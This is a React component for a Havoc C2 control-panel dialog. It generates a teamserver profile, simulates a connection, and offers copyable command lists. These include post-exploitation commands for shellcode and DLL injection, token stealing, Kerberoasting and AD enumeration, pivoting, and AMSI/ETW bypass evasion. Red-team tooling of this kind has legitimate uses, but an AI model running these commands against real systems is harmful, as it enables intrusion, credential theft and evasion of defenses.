import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { toast } from "@/hooks/use-toast";
import { Copy, Check, Server, Key, User, Globe, Radio, Zap, Terminal, Shield } from "lucide-react";

interface HavocConfig {
  teamserverHost: string;
  teamserverPort: string;
  username: string;
  password: string;
  listenerHost: string;
  listenerPort: string;
}

interface HavocDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const defaultConfig: HavocConfig = {
  teamserverHost: "",
  teamserverPort: "40056",
  username: "",
  password: "",
  listenerHost: "",
  listenerPort: "443",
};

export function HavocDialog({ open, onOpenChange }: HavocDialogProps) {
  const [config, setConfig] = useState<HavocConfig>(() => {
    const saved = localStorage.getItem("havoc-config");
    return saved ? JSON.parse(saved) : defaultConfig;
  });
  const [isConnected, setIsConnected] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const handleSaveConfig = () => {
    localStorage.setItem("havoc-config", JSON.stringify(config));
    toast({ title: "Configuration Saved", description: "Havoc settings saved locally" });
  };

  const handleConnect = async () => {
    if (!config.teamserverHost || !config.password) {
      toast({ title: "Missing Fields", description: "Please fill in all required fields", variant: "destructive" });
      return;
    }
    setIsConnecting(true);
    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);
      handleSaveConfig();
      toast({ title: "Connected", description: `Connected to Havoc teamserver at ${config.teamserverHost}` });
    }, 2000);
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const teamserverConfig = `
Teamserver {
    Host = "${config.teamserverHost || "0.0.0.0"}"
    Port = ${config.teamserverPort || "40056"}

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "${config.username || "operator"}" {
        Password = "${config.password || "password123"}"
    }
}

Listeners {
    Http {
        Name = "HTTPS Listener"
        Hosts = ["${config.listenerHost || config.teamserverHost || "0.0.0.0"}"]
        PortBind = ${config.listenerPort || "443"}
        PortConn = ${config.listenerPort || "443"}
        Secure = true
    }
}`;

  const listeners = [
    {
      name: "HTTPS Listener",
      config: `Name = "HTTPS"
Hosts = ["${config.listenerHost || "<HOST>"}"]
PortBind = 443
PortConn = 443
Secure = true
UserAgent = "Mozilla/5.0"`,
    },
    {
      name: "HTTP Listener",
      config: `Name = "HTTP"
Hosts = ["${config.listenerHost || "<HOST>"}"]
PortBind = 80
PortConn = 80
Secure = false`,
    },
    {
      name: "SMB Listener",
      config: `Name = "SMB Pivot"
PipeName = "havoc_pipe"`,
    },
  ];

  const demonCommands = [
    { name: "System Info", command: "whoami" },
    { name: "Process List", command: "proc list" },
    { name: "Process Kill", command: "proc kill <PID>" },
    { name: "File Browser", command: "dir <path>" },
    { name: "Upload File", command: "upload /local/path C:\\\\remote\\\\path" },
    { name: "Download File", command: "download C:\\\\remote\\\\path /local/path" },
    { name: "Screenshot", command: "screenshot" },
    { name: "Shell Command", command: "shell <command>" },
    { name: "PowerShell", command: "powershell <command>" },
    { name: "Inject Shellcode", command: "shellcode inject x64 <PID> /path/to/shellcode.bin" },
    { name: "Spawn & Inject", command: "shellcode spawn x64 /path/to/shellcode.bin" },
    { name: "DLL Inject", command: "dll inject <PID> /path/to/dll.dll" },
    { name: "Token Steal", command: "token steal <PID>" },
    { name: "Token Revert", command: "token revert" },
    { name: "Make Token", command: "token make <domain> <user> <password>" },
    { name: "Inline Execute", command: "inline-execute /path/to/bof.o arg1 arg2" },
    { name: "SOCKS5 Proxy", command: "socks start <port>" },
    { name: "Port Forward", command: "rportfwd add <lport> <rhost> <rport>" },
  ];

  const bofCommands = [
    { name: "ADSearch", command: "inline-execute /bofs/adsearch.o (user|computer|group) name" },
    { name: "NetLocalGroupList", command: "inline-execute /bofs/netlocalgroup.o list <target>" },
    { name: "NetLocalGroupListMembers", command: "inline-execute /bofs/netlocalgroup.o listmembers <target> Administrators" },
    { name: "WMI Query", command: "inline-execute /bofs/wmi_query.o SELECT * FROM Win32_Process" },
    { name: "Reg Query", command: "inline-execute /bofs/reg_query.o HKLM\\\\SOFTWARE\\\\Microsoft" },
    { name: "LDAP Whoami", command: "inline-execute /bofs/ldap_whoami.o" },
    { name: "Kerberoast", command: "inline-execute /bofs/kerberoast.o <spn>" },
    { name: "Enumerate Pipes", command: "inline-execute /bofs/enum_pipes.o" },
  ];

  const evasion = [
    { name: "Sleep Mask", command: "config sleep-mask true" },
    { name: "Obfuscate Sleep", command: "config sleep-obf true" },
    { name: "Indirect Syscalls", command: "config indirect-syscall true" },
    { name: "Stack Spoof", command: "config stack-spoof true" },
    { name: "AMSI Bypass", command: "dotnet inline-execute /tools/amsi_bypass.exe" },
    { name: "ETW Patch", command: "dotnet inline-execute /tools/etw_patch.exe" },
  ];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl h-[85vh] bg-slate-900 border-orange-500/30 p-0 flex flex-col">
        <DialogHeader className="px-6 pt-6 pb-4 border-b border-slate-700/50 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-orange-500/20 rounded-lg">
              <span className="text-2xl">⚔️</span>
            </div>
            <div>
              <DialogTitle className="text-xl font-bold text-white flex items-center gap-2">
                Havoc C2 Framework
                {isConnected && <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">Connected</Badge>}
              </DialogTitle>
              <DialogDescription className="text-slate-400">Configure Havoc teamserver and manage Demons</DialogDescription>
            </div>
          </div>
        </DialogHeader>

        <Tabs defaultValue="connection" className="flex-1 flex flex-col min-h-0">
          <TabsList className="mx-6 mt-4 bg-slate-800/50 border border-slate-700/50 flex-shrink-0">
            <TabsTrigger value="connection" className="data-[state=active]:bg-orange-500/20 data-[state=active]:text-orange-400">
              <Server className="w-4 h-4 mr-2" />Connection
            </TabsTrigger>
            <TabsTrigger value="listeners" className="data-[state=active]:bg-orange-500/20 data-[state=active]:text-orange-400">
              <Radio className="w-4 h-4 mr-2" />Listeners
            </TabsTrigger>
            <TabsTrigger value="demon" className="data-[state=active]:bg-orange-500/20 data-[state=active]:text-orange-400">
              <Terminal className="w-4 h-4 mr-2" />Demon
            </TabsTrigger>
            <TabsTrigger value="bof" className="data-[state=active]:bg-orange-500/20 data-[state=active]:text-orange-400">
              <Zap className="w-4 h-4 mr-2" />BOF
            </TabsTrigger>
            <TabsTrigger value="evasion" className="data-[state=active]:bg-orange-500/20 data-[state=active]:text-orange-400">
              <Shield className="w-4 h-4 mr-2" />Evasion
            </TabsTrigger>
          </TabsList>

          <div className="flex-1 min-h-0 px-6 pb-6">
            <ScrollArea className="h-full mt-4">
              <TabsContent value="connection" className="mt-0 space-y-6">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-orange-400 uppercase tracking-wider flex items-center gap-2">
                    <Server className="w-4 h-4" />Teamserver Configuration
                  </h3>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Globe className="w-3.5 h-3.5" />Teamserver Host</Label>
                      <Input value={config.teamserverHost} onChange={(e) => setConfig({ ...config, teamserverHost: e.target.value })} placeholder="192.168.1.100" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Teamserver Port</Label>
                      <Input value={config.teamserverPort} onChange={(e) => setConfig({ ...config, teamserverPort: e.target.value })} placeholder="40056" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><User className="w-3.5 h-3.5" />Username</Label>
                      <Input value={config.username} onChange={(e) => setConfig({ ...config, username: e.target.value })} placeholder="operator" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Key className="w-3.5 h-3.5" />Password</Label>
                      <Input type="password" value={config.password} onChange={(e) => setConfig({ ...config, password: e.target.value })} placeholder="••••••••" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300">Listener Host</Label>
                      <Input value={config.listenerHost} onChange={(e) => setConfig({ ...config, listenerHost: e.target.value })} placeholder="External IP" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Listener Port</Label>
                      <Input value={config.listenerPort} onChange={(e) => setConfig({ ...config, listenerPort: e.target.value })} placeholder="443" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <div className="flex items-center justify-between mb-3">
                    <h3 className="text-sm font-semibold text-orange-400 uppercase tracking-wider">Profile (havoc.yaotl)</h3>
                    <Button variant="ghost" size="sm" onClick={() => copyToClipboard(teamserverConfig, 'profile')} className="h-7 px-2">
                      {copiedField === 'profile' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                    </Button>
                  </div>
                  <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto whitespace-pre">{teamserverConfig}</pre>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${isConnected ? 'bg-emerald-500 shadow-lg shadow-emerald-500/50' : 'bg-red-500/70'}`} />
                      <span className="text-slate-300">{isConnected ? `Connected to ${config.teamserverHost}` : "Not connected"}</span>
                    </div>
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={handleSaveConfig} className="border-slate-600 hover:bg-slate-700">Save</Button>
                      <Button size="sm" onClick={handleConnect} disabled={isConnecting} className="bg-orange-600 hover:bg-orange-500">
                        {isConnecting ? "Connecting..." : "Connect"}
                      </Button>
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h3 className="text-sm font-semibold text-amber-400 uppercase tracking-wider mb-3">Quick Start</h3>
                  <div className="space-y-2 text-sm text-slate-400">
                    <p>1. Create profile: <code className="bg-slate-900 px-2 py-1 rounded text-orange-400">nano /opt/havoc/profiles/havoc.yaotl</code></p>
                    <p>2. Start teamserver: <code className="bg-slate-900 px-2 py-1 rounded text-orange-400">./teamserver server --profile ./profiles/havoc.yaotl</code></p>
                    <p>3. Launch client: <code className="bg-slate-900 px-2 py-1 rounded text-orange-400">./havoc client</code></p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="listeners" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">Listener configurations for havoc.yaotl profile.</p>
                {listeners.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-sm font-semibold text-orange-400">{item.name}</h4>
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(item.config, `listener-${index}`)} className="h-7 px-2">
                        {copiedField === `listener-${index}` ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto whitespace-pre">{item.config}</pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="demon" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Demon agent commands.</p>
                <div className="grid grid-cols-2 gap-3">
                  {demonCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-orange-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `demon-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `demon-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-orange-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="bof" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Beacon Object File execution.</p>
                <div className="grid grid-cols-1 gap-3">
                  {bofCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-orange-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `bof-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `bof-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-cyan-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="evasion" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Evasion and OPSEC features.</p>
                <div className="grid grid-cols-2 gap-3">
                  {evasion.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-orange-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `evasion-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `evasion-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-purple-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>
            </ScrollArea>
          </div>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}
